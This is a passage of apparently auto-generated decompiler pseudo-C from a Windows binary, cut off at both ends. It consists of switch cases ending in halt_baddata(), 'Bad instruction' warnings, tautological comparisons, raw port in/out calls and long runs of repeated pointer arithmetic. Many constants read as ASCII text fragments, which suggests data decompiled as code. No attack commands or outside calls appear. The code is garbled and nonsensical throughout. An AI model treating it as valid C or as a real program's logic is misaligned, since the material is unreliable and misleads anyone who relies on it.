case 0x79:\n    case 0xf3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7a:\n    case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7e:\n    case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7f:\n    case 0xe4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x83:\n    case 0xe8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x84:\n    case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x88:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x90:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xde:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (0xfffffffebff028ff < uVar18 || puVar20 == NULL) {\n        puVar20 = unaff_RDI + unaff_RBP * 2 + 99;\n        *puVar20 = *puVar20 & 0xd7;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *0x1400fd773 = *0x1400fd773 & 0xd7;\n    uVar33 = puVar20 >> 8;\n    *0x160394d67 = *0x160394d67 & uVar33;\n    cVar11 = puVar20;\n    cVar10 = in_stack_00000030;\n    uVar25 = in_stack_00000030 >> 8;\n    uVar29 = SUB82(in_stack_00000030, 0);\n    iVar15 = in_stack_00000030;\n    if (0x6968741f < uVar45) {\n        ppcVar36 = CONCAT22(*0x1400fd709, *0x1400fd707) * 0x69727473;\n        puVar19 = unaff_RSI + 1;\n        out(*unaff_RSI, uVar29);\n        puVar44 = iVar15;\n        bVar47 = 0xd6 < *puVar44;\n        bVar49 = *puVar44 == 0xd6;\n        puStack104 = unaff_RDI;\n        if (!SBORROW1(-0x2a, *puVar44)) {\n            if (!bVar47) {\n                puVar44 = in_stack_00000030 + 0x61;\n                bVar47 = CARRY1(*puVar44, uVar33);\n                *puVar44 = *puVar44 + uVar33;\n                bVar49 = *puVar44 == 0;\n                if (!bVar47) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                uVar14 = *(unaff_RDI + 0x73);\n                if (!bVar49) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\ncode_r0x0001400fd8b0:\n                arg1 = uVar14;\n                if (bVar49) {\ncode_r0x0001400fd924:\n                    if (!bVar47) goto code_r0x0001400fd98f;\n                    arg1 = *(puStack104 + 0x73);\n                    if (bVar49) goto code_r0x0001400fd99d;\n                }\n                else {\n                    bVar47 = *(puVar19 + 0x67) * 0x6e693a3a != *(puVar19 + 0x67) * 0x6e693a3a;\n                    if (!bVar47) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    if (bVar47) {\ncode_r0x0001400fd931:\n                        if (!bVar47) goto code_r0x0001400fd99c;\n                        arg1 = *(unaff_RDI + 0x73);\n                        if (!bVar49) {\n                            return;\n                        }\n                        if (!bVar49) {\n                            bVar50 = *(puVar19 + 0x67) * 0x6f633a3a != *(puVar19 + 0x67) * 0x6f633a3a;\n                            goto code_r0x0001400fd9dc;\n                        }\n                        *puVar19 = *puVar19 & arg1 >> 8;\n                        goto code_r0x0001400fd9a1;\n                    }\n                    *puVar20 = *puVar20 + cVar11;\n                    puVar44 = in_stack_00000030 + 0x61;\n                    uVar26 = *puVar44;\n                    *puVar44 = *puVar44 + uVar33;\n                    bVar49 = *puVar44 == 0;\n                    if (!CARRY1(uVar26, uVar33)) {\n                        puVar44 = iVar15 + 0x61;\n                        bVar47 = CARRY1(*puVar44, uVar33);\n                        *puVar44 = *puVar44 + uVar33;\n                        bVar49 = *puVar44 == 0;\n                        goto code_r0x0001400fd931;\n                    }\n                    arg1 = *(unaff_RDI + 0x73);\n                    if (!bVar49) {\n                        bVar47 = *(puVar19 + 0x67) * 0x535f3a3a != *(puVar19 + 0x67) * 0x535f3a3a;\n                        goto code_r0x0001400fd8d0;\n                    }\n                }\n                ppcVar38 = *(arg1 + 0x5f) * 0x69727473;\n                puVar44 = puVar19 + 1;\n                out(*puVar19, uVar29);\n                if (arg1 >> 8 < *iVar15) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar20 = uVar45 + 0x85968cc2;\n                *(in_GS_OFFSET + 0x1400fd700) = *(in_GS_OFFSET + 0x1400fd700) + ')';\n                goto code_r0x0001400fd9bc;\n            }\n            puStack104 = *ppcVar36;\n            ppcVar36 = ppcVar36 + 1;\n            if (!bVar47) {\n                out(*puVar19, uVar29);\n                return;\n            }\n            puVar44 = puVar19;\n            if (!bVar47) {\n                out(*puVar19, uVar29);\n                return;\n            }\ncode_r0x0001400fd907:\n            if (!bVar47) {\n                puVar19 = puVar44 + 1;\n                out(*puVar44, uVar29);\n                uVar26 = arg1 >> 8;\n                bVar47 = uVar26 < *iVar15;\n                bVar48 = (POPCOUNT(uVar26 - *iVar15) & 1U) == 0;\n                if (bVar47) {\n                    *(in_GS_OFFSET + 0x1400fd700) = *(in_GS_OFFSET + 0x1400fd700) + ')';\n                    goto code_r0x0001400fd977;\n                }\n                goto code_r0x0001400fd90f;\n            }\n            uVar18 = *(in_stack_00000030 + 0x65) * 0x28202928;\n            puStack104 = uVar18 & 0xffffffff;\n            bVar47 = uVar18 != uVar18;\ncode_r0x0001400fd979:\n            puVar19 = puVar44;\n            if (bVar47 || bVar49) goto code_r0x0001400fd97b;\ncode_r0x0001400fd9e3:\n            arg1 = *(puStack104 + 0x73);\n            if (bVar49) goto code_r0x0001400fda5a;\n            unaff_RDI = puStack104 + 1;\n            uVar3 = in(uVar29);\n            *puStack104 = uVar3;\n            goto code_r0x0001400fd9e2;\n        }\n        puVar44 = in_stack_00000030 + 0x61;\n        bVar47 = CARRY1(*puVar44, uVar33);\n        uVar26 = *puVar44;\n        *puVar44 = *puVar44 + uVar33;\n        bVar49 = *puVar44 == 0;\n        bVar48 = (POPCOUNT(*puVar44) & 1U) == 0;\n        if (bVar47) {\n            arg1 = *(unaff_RDI + 0x73);\n            if ((bVar49) || (bVar47 = *(unaff_RSI + 0x68) * 0x73613a3a != *(unaff_RSI + 0x68) * 0x73613a3a,  !bVar47))\n            goto code_r0x0001400fd90f;\n            puVar43 = puVar19;\n            puVar19 = puVar19 & 0xffffffff00000000 | ZEXT48(puVar43 + 1);\n            out(*puVar43, uVar29);\n            puVar44 = in_stack_00000030 + 0x61;\n            bVar47 = CARRY1(*puVar44, uVar33);\n            *puVar44 = *puVar44 + uVar33;\n            bVar49 = *puVar44 == 0;\n            if (bVar47) {\n                uVar14 = *(unaff_RDI + 0x73);\n                goto code_r0x0001400fd8b0;\n            }\ncode_r0x0001400fd916:\n            if (!bVar47) {\n                *0x140394f01 = *0x140394f01 & uVar33;\n                goto code_r0x0001400fd987;\n            }\n            arg1 = *(puStack104 + 0x73);\n            if (!bVar49) {\n                bVar47 = *(puVar19 + 0x67) * 0x61623a3a != *(puVar19 + 0x67) * 0x61623a3a;\n                goto code_r0x0001400fd924;\n            }\n            goto code_r0x0001400fd98f;\n        }\ncode_r0x0001400fd901:\n        puVar19 = unaff_RSI + 1;\n        bVar50 = SCARRY1(uVar26, uVar33);\n        if (bVar47) {\n            arg1 = *(puStack104 + 0x73);\n            if (bVar49) goto code_r0x0001400fd97a;\n            bVar47 = *(unaff_RSI + 0x68) * 0x65723a3a != *(unaff_RSI + 0x68) * 0x65723a3a;\ncode_r0x0001400fd90f:\n            if (!bVar47) goto code_r0x0001400fd97a;\n            if (bVar48) {\n                *(puStack104 + 0x1a) = *(puStack104 + 0x1a) - uVar25;\n                goto code_r0x0001400fd97b;\n            }\n            puVar44 = in_stack_00000030 + 0x61;\n            bVar47 = CARRY1(*puVar44, uVar33);\n            *puVar44 = *puVar44 + uVar33;\n            bVar49 = *puVar44 == 0;\n            goto code_r0x0001400fd916;\n        }\n        *(ppcVar36 + -8) = 0x3e2d7369;\n        if (bVar47) {\n            if (bVar48) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *0x1400fd700 = *0x1400fd700 + ')';\ncode_r0x0001400fd977:\n            bVar47 = false;\n            *puVar20 = *puVar20 & 0xd7;\n            bVar49 = *puVar20 == 0;\n            puVar44 = puVar19;\n            goto code_r0x0001400fd979;\n        }\ncode_r0x0001400fd9dc:\n        if (!bVar50) {\n            puVar44 = in_stack_00000030 + 0x61;\n            uVar25 = *puVar44;\n            *puVar44 = *puVar44 + uVar33;\n            bVar49 = *puVar44 == 0;\n            if (!CARRY1(uVar25, uVar33)) {\n                return;\n            }\n            goto code_r0x0001400fd9e3;\n        }\ncode_r0x0001400fda5a:\n        if (!bVar49) {\n            bVar47 = *(puVar19 + 0x67) * 0x65723a3a != *(puVar19 + 0x67) * 0x65723a3a;\n            puVar44 = puVar19;\n            unaff_RDI = puStack104;\n            goto joined_r0x0001400fda63;\n        }\ncode_r0x0001400fdace:\n        uVar2 = in(uVar29);\n        *puStack104 = uVar2;\n        puVar44 = puVar19;\ncode_r0x0001400fdacf:\n        iVar5 = *(puVar20 * 2 + 0x62) * 0x63697361;\n        bVar47 = iVar5 != iVar5;\n        if (bVar47) {\n            if (!bVar47) {\n                out(*puVar44, uVar29);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            goto code_r0x0001400fdb45;\n        }\ncode_r0x0001400fdb4e:\n        *puVar20 = *puVar20 + puVar20;\n    }\n    else {\n        if (0x6968741f < uVar45) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar19 = unaff_RSI;\n        if ((POPCOUNT(uVar45 + 0x96978be0 & 0xff) & 1U) == 0) {\n            puVar44 = in_stack_00000030 + in_GS_OFFSET + 0x61;\n            bVar47 = CARRY1(*puVar44, uVar33);\n            *puVar44 = *puVar44 + uVar33;\n            bVar49 = *puVar44 == 0;\n            if (bVar47) {\n                arg1 = *(unaff_RDI + 0x73);\n                goto code_r0x0001400fd868;\n            }\n            ppcVar36 = &stack0xffffffffffffff98;\n            puStack104 = 0x1400fd6a8;\ncode_r0x0001400fd8d0:\n            unaff_RDI = *ppcVar36;\n            puVar17 = ppcVar36 + 1;\n            puVar37 = ppcVar36 + 1;\n            unaff_RBP = *(unaff_RDI + 0x6e);\n            puVar9 = ppcVar36 + 1;\n            if (!bVar47) goto code_r0x0001400fd94a;\n            if (!bVar47) {\n                puVar19 = *(uVar18 + 0x1400fd76e);\n                goto code_r0x0001400fd8dc;\n            }\ncode_r0x0001400fd94d:\n            *puVar20 = *puVar20 + puVar20;\n            uVar33 = puVar20 >> 8;\n            bVar47 = CARRY1(*0x19f3013c8, uVar33);\n            bVar49 = SCARRY1(*0x19f3013c8, uVar33);\n            *0x19f3013c8 = *0x19f3013c8 + uVar33;\n            puStack104 = *puVar17;\n            ppcVar36 = puVar17 + 1;\n            if (bVar49) {\n                return;\n            }\n            if (!bVar47) {\ncode_r0x0001400fd97a:\n                *(ppcVar36 + -8) = 0x20686369;\n                *puVar20 = *puVar20 + puVar20;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(puStack104 + 0x1a) = *(puStack104 + 0x1a) - uVar25;\n            goto code_r0x0001400fd95d;\n        }\n        *0x1400fd700 = *0x1400fd700 + ')';\n        *puVar20 = *puVar20 & 0xd7;\n        bVar49 = *puVar20 == 0;\n        if (bVar49) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\ncode_r0x0001400fd868:\n        if (bVar49) {\ncode_r0x0001400fd8dc:\n            puVar9 = puVar37;\n            if (!bVar49) {\ncode_r0x0001400fd94a:\n                puVar17 = puVar9;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                puVar20 = uVar45 & 0x5f203a73;\n                goto code_r0x0001400fd94d;\n            }\n            puStack104 = unaff_RDI + 1;\n            uVar2 = in(uVar29);\n            *unaff_RDI = uVar2;\n            puVar44 = puVar19 + 0x6f;\n            bVar47 = false;\n            *puVar44 = *puVar44 & 0xd7;\n            bVar49 = *puVar44 == 0;\n        }\n        else {\n            uVar4 = *(unaff_RSI + 0x67) * 0x4d5f3a3a;\n            unaff_RBP = uVar4 & 0xffffffff;\n            bVar47 = uVar4 != uVar4;\n            ppcVar36 = &stack0xffffffffffffffa0;\n            puVar37 = &stack0xffffffffffffffa0;\n            if (bVar47) {\n                if (bVar49) {\n                    out(*unaff_RSI, uVar29);\n                    puVar19 = in_stack_00000030 + in_FS_OFFSET + 0x61;\n                    bVar47 = CARRY1(*puVar19, uVar33);\n                    uVar26 = *puVar19;\n                    *puVar19 = *puVar19 + uVar33;\n                    bVar49 = *puVar19 == 0;\n                    bVar48 = (POPCOUNT(*puVar19) & 1U) == 0;\n                    goto code_r0x0001400fd901;\n                }\n                puVar19 = unaff_RSI + 1;\n                out(*unaff_RSI, uVar29);\n                unaff_RDI = puStack104;\n                goto code_r0x0001400fd8dc;\n            }\n            puVar37 = &stack0xffffffffffffffa0;\n            if (!bVar47) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        if (bVar49) {\n            puStack104 = *puVar37;\n            ppcVar36 = puVar37 + 1;\n            puVar44 = puVar19;\n            if (bVar47) goto code_r0x0001400fd907;\ncode_r0x0001400fd97b:\n            ppcVar36 = *(arg1 + 0x68) * 0x20736920;\n            puVar20 = uVar45 & 0x29757a;\ncode_r0x0001400fd987:\n            puVar44 = in_stack_00000030 + 0x61;\n            uVar33 = *puVar44;\n            uVar25 = puVar20 >> 8;\n            *puVar44 = *puVar44 + uVar25;\n            bVar49 = *puVar44 == 0;\n            if (!CARRY1(uVar33, uVar25)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            arg1 = *(puStack104 + 0x73);\ncode_r0x0001400fd98f:\n            if (bVar49) {\n                *ppcVar36 = arg1;\n                return;\n            }\ncode_r0x0001400fd991:\n            puStack104 = *(ppcVar36 + 8);\ncode_r0x0001400fd99c:\n            out(*puVar19, uVar29);\n            puVar19 = puVar19 + 1;\n        }\n        else {\n            if (bVar47 || bVar49) {\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                puVar17 = puVar37;\n                goto code_r0x0001400fd94d;\n            }\n            uVar2 = in(uVar29);\n            *puStack104 = uVar2;\n            uVar4 = *(puVar20 + uVar18 + 0x1400fd762) * 0x63697361;\n            bVar47 = uVar4 == uVar4;\n            puStack104 = *(uVar4 & 0xffffffff);\n            ppcVar36 = (uVar4 & 0xffffffff) + 1;\n            if (bVar47) {\n                if (bVar49) {\n                    *puVar19 = *puVar19 & arg1 >> 8;\n                    puVar44 = uVar18 + 0x1400fd769 + unaff_RBP * 2;\n                    *puVar44 = *puVar44 & uVar25;\n                    goto code_r0x0001400fd95d;\n                }\n                goto code_r0x0001400fd991;\n            }\n            if (bVar47) {\n                out(*puVar19, uVar29);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\ncode_r0x0001400fd95d:\n            puVar20 = puVar20 & 0x2029757a;\n            puVar20[unaff_RBP * 2 + 0x69] = puVar20[unaff_RBP * 2 + 0x69] & uVar25;\n        }\ncode_r0x0001400fd99d:\n        *puVar20 = *puVar20 & 0xd7;\n        unaff_RDI = puStack104;\n        if (*puVar20 != 0) {\n            return;\n        }\ncode_r0x0001400fd9a1:\n        ppcVar38 = *(arg1 + 0x68) * 0x20736920;\n        uVar14 = puVar20 & 0x2029757a;\n        puVar20 = uVar14;\n        if (0x6968741f < uVar14) {\ncode_r0x0001400fd9e2:\n            ppcVar38 = *(arg1 + 0x5f) * 0x69727473;\n            puVar44 = puVar19 + 1;\n            out(*puVar19, uVar29);\n            uVar33 = arg1 >> 8;\n            bVar47 = uVar33 < *iVar15;\n            if (SBORROW1(uVar33, *iVar15)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if (bVar47) {\n                if (!bVar47) goto code_r0x0001400fdacf;\n                if (!bVar47) {\n                    out(*puVar44, uVar29);\n                    bVar47 = SBORROW1(uVar33, *iVar15);\n                    puVar44 = puVar19 + 2;\n                    if (*iVar15 <= uVar33) goto joined_r0x0001400fda63;\n                    out(puVar19[2], uVar29);\n                    puVar44 = puVar19 + 7;\n                    out(*(puVar19 + 3), uVar29);\n                }\ncode_r0x0001400fdac6:\n                puStack104 = unaff_RDI + 1;\n                uVar2 = in(uVar29);\n                *unaff_RDI = uVar2;\n                puVar1 = puVar44 + 0x6f;\n                *puVar1 = *puVar1 & 0xd7;\n                if (*puVar1 == 0) {\n                    puVar19 = in_stack_00000030 + 0x61;\n                    uVar33 = puVar20 >> 8;\n                    bVar47 = CARRY1(*puVar19, uVar33);\n                    *puVar19 = *puVar19 + uVar33;\n                    uVar33 = *puVar19;\n                    goto code_r0x0001400fdaef;\n                }\n                puVar19 = puVar44;\n                if (*puVar1 != 0) goto code_r0x0001400fdace;\ncode_r0x0001400fdb2f:\n                *puVar20 = *puVar20 + cVar10;\n                *puVar20 = *puVar20 + puVar20;\n                *puVar20 = *puVar20 + puVar20;\n                goto code_r0x0001400fdb35;\n            }\n            puVar1 = in_stack_00000030 + 0x61;\n            uVar33 = *puVar1;\n            uVar25 = puVar20 >> 8;\n            bVar47 = SCARRY1(*puVar1, uVar25);\n            *puVar1 = *puVar1 + uVar25;\n            bVar49 = *puVar1 == 0;\n            if (CARRY1(uVar33, uVar25)) {\n                if (!bVar49) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                if ((bVar49) || (*(puVar19 + 0x68) * 0x73613a3a == *(puVar19 + 0x68) * 0x73613a3a)) {\ncode_r0x0001400fdae4:\n                    puVar19 = puVar44;\n                    uVar33 = *(unaff_RDI + 0x73) >> 8;\n                    if (bVar49) {\n                        cVar11 = puVar20;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar19 = *puVar19 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar19 = *puVar19 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *in_stack_00000030 = *in_stack_00000030;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *in_stack_00000030 = *in_stack_00000030;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *puVar20 = *puVar20 + cVar11;\n                        *(puVar20 * 2) = *(puVar20 * 2);\n                        goto code_r0x0001400fdb92;\n                    }\n                    goto code_r0x0001400fdaf7;\n                }\n                puVar19 = puVar44 & 0xffffffff00000000 | ZEXT48(puVar44 + 1);\n                out(*puVar44, uVar29);\n                puVar44 = in_stack_00000030 + 0x61;\n                uVar33 = *puVar44;\n                *puVar44 = *puVar44 + uVar25;\n                if (CARRY1(uVar33, uVar25)) {\n                    arg1 = *(unaff_RDI + 0x73);\n                    uVar33 = arg1 >> 8;\n                    if (*puVar44 != 0) {\n                        bVar48 = *(puVar19 + 0x67) * 0x70613a3a != *(puVar19 + 0x67) * 0x70613a3a;\n                        bVar49 = bVar48;\n                        goto code_r0x0001400fda8e;\n                    }\n                    goto code_r0x0001400fdaf7;\n                }\n                puVar19 = iVar15 + 0x61;\n                bVar47 = CARRY1(*puVar19, uVar25);\n                *puVar19 = *puVar19 + uVar25;\n                uVar33 = *puVar19;\ncode_r0x0001400fdaef:\n                if (bVar47) {\n                    if (uVar33 != 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                goto code_r0x0001400fdb5a;\n            }\njoined_r0x0001400fda63:\n            if (!bVar47) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            puVar19 = in_stack_00000030 + 0x61;\n            uVar33 = *puVar19;\n            uVar25 = puVar20 >> 8;\n            *puVar19 = *puVar19 + uVar25;\n            bVar49 = *puVar19 == 0;\n            if (CARRY1(uVar33, uVar25)) {\n                if ((!bVar49) && (*(puVar44 + 0x67) * 0x61623a3a != *(puVar44 + 0x67) * 0x61623a3a))\n                goto code_r0x0001400fdae4;\n                goto code_r0x0001400fdb4d;\n            }\n        }\n        else {\n            if (0x6968741f < uVar14) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if ((POPCOUNT(uVar14 + 0x96978be0 & 0xff) & 1U) == 0) {\n                puVar44 = in_stack_00000030 + in_GS_OFFSET + 0x61;\n                uVar26 = puVar20 >> 8;\n                bVar48 = CARRY1(*puVar44, uVar26);\n                uVar25 = *puVar44;\n                *puVar44 = *puVar44 + uVar26;\n                bVar47 = *puVar44 == 0;\n                uVar33 = *puVar44;\n                bVar49 = SCARRY1(uVar25, uVar26);\n                if (bVar48) {\n                    arg1 = *(unaff_RDI + 0x73);\n                    goto code_r0x0001400fda28;\n                }\ncode_r0x0001400fda8e:\n                uVar33 = arg1 >> 8;\n                if (bVar49) {\n                    if (bVar48) {\n                        return;\n                    }\ncode_r0x0001400fdaf7:\n                    out(*puVar19, uVar29);\n                    if (uVar33 < *iVar15) {\n                        return;\n                    }\n                    uVar33 = puVar20;\n                    *puVar20 = *puVar20 + uVar33;\n                    *puVar20 = *puVar20 + uVar33;\n                    *puVar20 = *puVar20 + uVar33;\n                    *puVar20 = *puVar20 | uVar33;\n                    *puVar20 = *puVar20 + uVar33;\n                    *puVar20 = *puVar20 + uVar33;\n                    *puVar20 = *puVar20 + uVar33;\n                    uVar33 = uVar33 | *puVar20;\n                    puVar19 = puVar20 & 0xffffffffffffff00 | uVar33;\n                    *puVar19 = *puVar19 + uVar33;\n                    *puVar19 = *puVar19 + uVar33;\n                    *puVar19 = *puVar19 + uVar33;\n                    uVar33 = uVar33 | *puVar19;\n                    puVar20 = puVar20 & 0xffffffffffffff00 | uVar33;\n                    *puVar20 = *puVar20 + uVar33;\n                    *puVar20 = *puVar20 + uVar33;\n                    *puVar20 = *puVar20 + uVar33;\ncode_r0x0001400fdb92:\n                    cVar11 = puVar20;\n                    *puVar20 = *puVar20 + cVar11;\n                    *puVar20 = *puVar20 + cVar11;\n                    *puVar20 = *puVar20 + cVar11;\n                    *puVar20 = *puVar20 + cVar11;\n                    *puVar20 = *puVar20 + cVar11;\n                    *puVar20 = *puVar20 + cVar11;\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar44 = puVar19 + 1;\n                out(*puVar19, uVar29);\n                puVar19 = in_stack_00000030 + in_FS_OFFSET + 0x61;\n                uVar33 = *puVar19;\n                uVar25 = puVar20 >> 8;\n                *puVar19 = *puVar19 + uVar25;\n                bVar49 = (POPCOUNT(*puVar19) & 1U) == 0;\n                if (CARRY1(uVar33, uVar25)) {\n                    if (*puVar19 == 0) goto code_r0x0001400fdb0e;\n                    goto code_r0x0001400fda9c;\n                }\n                *puVar20 = *puVar20 + puVar20;\n                *puVar20 = *puVar20 + puVar20;\ncode_r0x0001400fdb06:\n                *puVar20 = *puVar20 + puVar20;\ncode_r0x0001400fdb08:\n                *puVar20 = *puVar20 + puVar20;\n                *puVar20 = *puVar20 + puVar20;\ncode_r0x0001400fdb0c:\n                *puVar20 = *puVar20 + puVar20;\ncode_r0x0001400fdb0e:\n                *puVar20 = *puVar20 + puVar20;\n                *(ppcVar38 + -8) = puVar20;\n                *(ppcVar38 + -0x10) = in_R11;\ncode_r0x0001400fdb15:\n                cVar11 = puVar20;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\ncode_r0x0001400fdb23:\n                cVar11 = puVar20;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                *0x1400fd700 = *0x1400fd700 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                *puVar20 = *puVar20 + cVar11;\n                goto code_r0x0001400fdb2f;\n            }\n            *0x1400fd700 = *0x1400fd700 + ')';\n            puVar44 = puVar19;\ncode_r0x0001400fd9bc:\n            *puVar20 = *puVar20 & 0xd7;\n            bVar47 = *puVar20 == 0;\n            uVar33 = *puVar20;\n            puVar19 = puVar44;\n            if (bVar47) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\ncode_r0x0001400fda28:\n            bVar49 = (POPCOUNT(uVar33) & 1U) == 0;\n            puVar44 = puVar19;\n            if (!bVar47) {\n                bVar47 = *(puVar19 + 0x67) * 0x4d5f3a3a != *(puVar19 + 0x67) * 0x4d5f3a3a;\n                ppcVar39 = ppcVar38 + 1;\n                ppcVar40 = ppcVar38 + 1;\n                ppcVar41 = ppcVar38 + 1;\n                if (bVar47) {\n                    if (bVar47) {\n                        ppcVar38 = ppcVar38 + 1;\n                        if (bVar47) goto code_r0x0001400fdb06;\n                        puVar44 = puVar19 + 1;\n                        out(*puVar19, uVar29);\n                        uVar33 = arg1 >> 8;\n                        bVar47 = uVar33 < *iVar15;\n                        bVar49 = (POPCOUNT(uVar33 - *iVar15) & 1U) == 0;\n                        ppcVar38 = ppcVar40;\n                        ppcVar42 = ppcVar39;\n                        if (bVar47) goto code_r0x0001400fdb08;\n                        goto code_r0x0001400fdaa3;\n                    }\n                    puVar20[0x4f] = puVar20[0x4f] + cVar10;\n                    *ppcVar38 = arg1;\n                }\n                else {\n                    if (!bVar47) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    ppcVar38 = ppcVar38 + 1;\n                    ppcVar42 = ppcVar41;\n                    if (bVar47) goto code_r0x0001400fdaa5;\n                }\n                goto code_r0x0001400fdb0e;\n            }\ncode_r0x0001400fda9c:\n            bVar47 = *(puVar44 + 0x67) * 0x65723a3a != *(puVar44 + 0x67) * 0x65723a3a;\n            ppcVar42 = ppcVar38;\ncode_r0x0001400fdaa3:\n            ppcVar38 = ppcVar42;\n            ppcVar42 = ppcVar38;\n            if (!bVar47) goto code_r0x0001400fdb0e;\ncode_r0x0001400fdaa5:\n            ppcVar38 = ppcVar42;\n            if (bVar49) goto code_r0x0001400fdb0c;\n            puVar19 = in_stack_00000030 + 0x61;\n            uVar33 = *puVar19;\n            uVar25 = puVar20 >> 8;\n            *puVar19 = *puVar19 + uVar25;\n            if (!CARRY1(uVar33, uVar25)) goto code_r0x0001400fdb15;\n            if (*puVar19 == 0) goto code_r0x0001400fdb23;\n            iVar5 = *(puVar44 + 0x67) * 0x535f3a3a;\n            bVar47 = iVar5 == iVar5;\n            unaff_RDI = *ppcVar42;\n            if (bVar47) {\ncode_r0x0001400fdb32:\n                uVar25 = puVar20;\n                *puVar20 = *puVar20 + uVar25;\n                *puVar20 = *puVar20 + uVar25;\n                uVar33 = *puVar20;\n                *puVar20 = *puVar20 + uVar25;\n                *puVar20 = *puVar20 + uVar25 + CARRY1(uVar33, uVar25);\n                *puVar20 = *puVar20 + uVar25;\n                *puVar20 = *puVar20 + uVar25;\n                *puVar20 = *puVar20 + uVar25;\n                uVar25 = uVar25 + *puVar20;\n                pcVar16 = puVar20 & 0xffffffffffffff00 | uVar25;\n                *pcVar16 = *pcVar16 + uVar25;\n                *pcVar16 = *pcVar16 + uVar25;\n                *pcVar16 = *pcVar16 + uVar25;\n                uVar25 = uVar25 + *pcVar16;\n                puVar20 = puVar20 & 0xffffffffffffff00 | uVar25;\n                *puVar20 = *puVar20 + uVar25;\n                *puVar20 = *puVar20 + uVar25;\n                goto code_r0x0001400fdb4e;\n            }\n            if (bVar47) {\n                puVar44 = *(puVar20 + 0x6e);\n                if (*puVar19 == 0) goto code_r0x0001400fdac6;\n                goto code_r0x0001400fdb32;\n            }\ncode_r0x0001400fdb35:\n            cVar11 = puVar20;\n            *puVar20 = *puVar20 + cVar11;\n            *puVar20 = *puVar20 + cVar10;\n            *puVar20 = 